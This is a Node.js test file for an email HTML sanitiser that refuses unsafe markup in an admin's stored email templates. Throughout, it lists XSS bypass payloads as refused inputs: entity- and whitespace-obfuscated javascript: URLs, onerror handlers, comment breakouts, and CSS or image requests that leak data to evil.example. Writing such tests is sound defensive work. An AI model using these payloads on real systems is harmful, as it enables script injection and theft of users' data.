'use strict';

// src/services/mail/html-safety.js: the gate an admin's email HTML passes
// before it is stored. It only refuses; nothing is rewritten.
const test = require('node:test');
const assert = require('node:assert/strict');
const { validateEmailHtml, scanHtml, MAX_EMAIL_HTML_BYTES } = require('../src/services/mail/html-safety');

const refused = (html, pattern) => {
  const result = validateEmailHtml(html);
  assert.equal(result.ok, false, `expected a refusal for ${html.slice(0, 80)}`);
  assert.equal(typeof result.reason, 'string');
  if (pattern) assert.match(result.reason, pattern);
};
const allowed = (html) => assert.deepEqual(validateEmailHtml(html), { ok: true }, html.slice(0, 80));

test('ordinary email HTML passes, conditional comments and styles included', () => {
  allowed('<p style="margin:0;color:#111">Hello <strong>there</strong></p>');
  allowed('<table role="presentation" width="100%"><tr><td><a href="https://example.com/x?a=1&amp;b=2">Go</a></td></tr></table>');
  allowed('<img src="https://my.onhomeroom.com/logo.png" alt="Homeroom" width="40">');
  allowed('<!DOCTYPE html><html><head><style>p { color: red; } @media (max-width:600px){ td{display:block} }</style></head><body>x</body></html>');
  allowed('<!--[if mso]><table><tr><td><![endif]--><p>x</p><!--[if mso]></td></tr></table><![endif]-->');
  allowed('<a href="mailto:hello@example.com">Mail us</a> <a href="{{url}}">Open</a>');
  allowed('Plain words with a < b and {{code}}');
});

test('blocked elements are refused, whatever their case', () => {
  for (const name of ['script', 'iframe', 'object', 'embed', 'form', 'link', 'meta', 'base']) {
    refused(`<p>x</p><${name}>`, new RegExp(name));
    refused(`<${name.toUpperCase()} x="1">`, new RegExp(name));
  }
  refused('<script/src="https://evil.example/x.js"></script>', /script/);
  refused('<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>', /svg/);
  refused('<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>');
});

test('event handler attributes are refused in any case', () => {
  refused('<p onclick="alert(1)">x</p>', /onclick/);
  refused('<p ONCLICK="alert(1)">x</p>', /onclick/i);
  refused('<img src="https://x.example/a.png" onerror=alert(1)>', /onerror/);
  refused('<a href="https://x.example" OnMouseOver = \'x\'>a</a>');
  refused('<p\nonload="x">');
  refused('<p/onload="x">');
});

test('script and data URLs are refused, however they are spelled', () => {
  refused('<a href="javascript:alert(1)">x</a>', /script or data/);
  refused('<a href="JavaScript:alert(1)">x</a>');
  refused('<a href="java&#115;cript:alert(1)">x</a>');
  refused('<a href="java&#x73;cript:alert(1)">x</a>');
  refused('<a href="java&#115cript:alert(1)">x</a>');
  refused('<a href="javascript&colon;alert(1)">x</a>');
  refused('<a href="  java\tscript:alert(1)">x</a>');
  refused('<a href="java&Tab;script:alert(1)">x</a>');
  refused('<a href=javascript:alert(1)>x</a>');
  refused('<a href="vbscript:x">x</a>');
  refused('<img src="data:image/png;base64,AAAA">');
  refused('<img src=" DATA:text/html,x">');
  refused('<a href="java{{url}}script:alert(1)">x</a>', /script or data/);
  refused('<td background="javascript:x">');
});

test('external stylesheets and script in CSS are refused', () => {
  refused('<style>@import url(https://evil.example/x.css);</style>', /@import/);
  refused('<style>@IMPORT "https://evil.example/x.css";</style>', /@import/);
  refused('<style>@\\69mport "https://evil.example/x.css";</style>', /@import/);
  refused('<p style="background:url(javascript:alert(1))">x</p>');
  refused('<p style="width:expression(alert(1))">x</p>');
  refused('<p style="background:url(data:image/png;base64,AAAA)">x</p>');
  refused('<div style="background:url(&#106;avascript:x)">');
});

test('comments cannot hide a tag from the check', () => {
  refused('<!--><script>alert(1)</script>-->');
  refused('<!---><script>alert(1)</script>-->');
  refused('<!-- x --!><script>alert(1)</script>-->');
  refused('<!--[if mso]><script>alert(1)</script><![endif]-->');
  refused('<!-- never closed <p>x</p>');
});

test('malformed or oversized documents are refused', () => {
  refused('<a href="https://x.example>never closed', /ends/);
  refused('<p class="x"', /ends/);
  refused('<p>\u0000</p>');
  const big = '<p>' + 'x'.repeat(MAX_EMAIL_HTML_BYTES) + '</p>';
  refused(big, /100 KB/);
  allowed('<p>' + 'x'.repeat(MAX_EMAIL_HTML_BYTES - 10) + '</p>');
  assert.equal(validateEmailHtml(null).ok, false);
});

test('scanHtml reports tags, quoted attribute value spans and style blocks by offset', () => {
  const src = '<p>a</p><a class=x href="{{url}}">b</a><style>p{}</style>';
  const scan = scanHtml(src);
  assert.equal(scan.ok, true);
  const a = scan.tags.find((tag) => tag.name === 'a');
  assert.equal(src.slice(a.start, a.end), '<a class=x href="{{url}}">');
  const href = a.attributes.find((attr) => attr.name === 'href');
  assert.equal(href.quote, '"');
  assert.equal(src.slice(href.valueStart, href.valueEnd), '{{url}}');
  assert.equal(a.attributes.find((attr) => attr.name === 'class').quote, '');
  const style = scan.rawTexts.find((block) => block.name === 'style');
  assert.equal(src.slice(style.start, style.end), 'p{}');
});

test('numeric references are decoded however many digits they have, leading zeros included', () => {
  refused('<a href="&#0000000106;avascript:alert(1)">x</a>', /script or data/);
  refused('<a href="&#x000000000006A;avascript:alert(1)">x</a>', /script or data/);
  refused('<a href="java&#0000000000000115cript:alert(1)">x</a>', /script or data/);
  refused('<p style="background:url(&#00000000106;avascript:x)">x</p>');
  refused('<p style="background:url(&#X0000000006a;avascript:x)">x</p>');
  allowed('<a href="https://example.com/&#99999999999999;">x</a>');
});

test('title and textarea text holds no markup, and every srcset candidate is checked', () => {
  refused('<title><img src=x onerror=alert(1)></title>', /<title>/);
  refused('<title/><img src=x onerror=1>', /<title>/);
  refused('<textarea><p>x</p></textarea>', /<textarea>/);
  allowed('<title>Your code &amp; more</title><textarea>plain</textarea>');
  refused('<img srcset="a.png 1x, data:image/svg+xml,xx 2x">', /script or data/);
  refused('<img srcset="a.png 1x,  &#100;ata:image/png,xx 2x">', /script or data/);
  allowed('<img src="https://x.example/a.png" alt="" srcset="https://x.example/a.png 1x, https://x.example/b.png?data=1 2x">');
});

test('scanHtml reports comment and bogus comment ranges', () => {
  const src = '<p>a</p><!-- c --><!x y><?z>';
  const scan = scanHtml(src);
  assert.deepEqual(scan.comments.map((c) => src.slice(c.start, c.end)), ['<!-- c -->', '<!x y>', '<?z>']);
});

test('openAtEnd names a part that leaves the parser outside ordinary text', () => {
  const { openAtEnd } = require('../src/services/mail/html-safety');
  for (const part of ['<p>Hi</p><', '<p>Hi</p><!x', '<p>Hi</p><?x', '<p>Hi</p></', 'Your code<style>', '<title>a', '<textarea>b']) {
    assert.match(openAtEnd(part), /ends/, part);
  }
  for (const part of ['<p>Hi</p>', 'a < b', '<style>p{}</style>', '<!-- x -->', '<!--[if mso]><b><![endif]-->', '']) {
    assert.equal(openAtEnd(part), null, part);
  }
});

test('openAtEnd: a part closes every element it opens, and none it did not', () => {
  const { openAtEnd } = require('../src/services/mail/html-safety');
  assert.match(openAtEnd('x<div style="display:none">'), /leaves <div> open/);
  assert.match(openAtEnd('</div><p>visible</p>'), /did not open/);
  assert.match(openAtEnd('<a href="https://a.test/"><b>x</a></b>'), /still open/);
  assert.equal(openAtEnd('<p>a<br><img src="https://a.test/x.png" alt=""></p><!--[if mso]><table><![endif]-->'), null);
});

test('template, select and their kin are not allowed', () => {
  for (const name of ['template', 'select', 'option', 'optgroup', 'datalist']) refused(`<p>x</p><${name}>`, new RegExp(name));
});

test('a <style> block reads no attribute and loads nothing; ping is refused', () => {
  refused('<style>a[href*="00"]{color:red}</style>', /attribute selector/);
  refused('<style>a{background:url(https://evil.example/b)}</style>', /url\(\)/);
  refused('<style>a{background:u\\72l(https://evil.example/b)}</style>', /url\(\)/);
  refused('<style>a{background-image:image-set("https://evil.example/b" 1x)}</style>', /image-set/);
  refused('<style>a{background:/*x*/url(https://evil.example/b)}</style>', /url\(\)/);
  allowed('<style>p{color:#333;margin:0}</style>');
  allowed('<p style="background:url(https://x.example/a.png)">x</p>');
  refused('<a href="https://x.example/" ping="https://evil.example/p">x</a>', /ping/);
});

test('<image> is read as the void <img> it is, and attr() is refused in any CSS', () => {
  allowed('<p>x<image src="https://x.example/a.png" alt=""></p>');
  refused('<p style="background:image(attr(href))">x</p>', /attr\(\)/);
  refused('<style>a::after{content:attr(href)}</style>', /attr\(\)/);
});

// Images: an admin's own upload is served from Homeroom over https, and the
// seeded emails draw brand images from the production origin, so any https
// address is fine. A data: URL is refused (Gmail and Outlook drop it), and so
// is plain http, which a mail client blocks or warns about.
test('html-safety allows <img src="https://..."> with alt, and refuses data: and http:', () => {
  allowed('<p><img src="https://app.onhomeroom.com/email-images/0123456789abcdef0123456789abcdef" alt="Our team" width="480" height="240" style="display:block;max-width:100%;height:auto;border:0"></p>');
  allowed('<img src="https://x.example/a.png" alt="">');
  // A placeholder in an image's address would be fetched on open, value and all.
  refused('<img src="{{url}}" alt="">', /cannot hold a placeholder/);
  refused('<img src="https://evil.example/p.gif?u={{url}}" alt="">', /cannot hold a placeholder/);
  refused('<img src=" {{url}}" alt="">', /cannot hold a placeholder/);
  refused('<img src="https://x.example/a.png" srcset="https://evil.example/{{code}}.png 2x" alt="">', /cannot hold a placeholder/);
  allowed('<IMG SRC="HTTPS://X.EXAMPLE/A.PNG" ALT="">');
  refused('<img src="data:image/png;base64,AAAA" alt="">', /data/);
  refused('<img src="http://x.example/a.png" alt="">', /https/);
  refused('<img src="  h&#116;tp://x.example/a.png" alt="">', /https/);
  refused('<img src="//x.example/a.png" alt="">', /https/);
  refused('<img src="/email-images/0123456789abcdef0123456789abcdef" alt="">', /https/);
  refused('<img alt="">', /https/);
  refused('<img src="https://x.example/a.png">', /alt/);
  refused('<img src="https://x.example/a.png" alt="" srcset="https://x.example/a.png 1x, http://x.example/b.png 2x">', /https/);
  // Inside an Outlook conditional comment the same rules hold.
  refused('<!--[if mso]><img src="http://x.example/a.png" alt=""><![endif]-->', /https/);
});
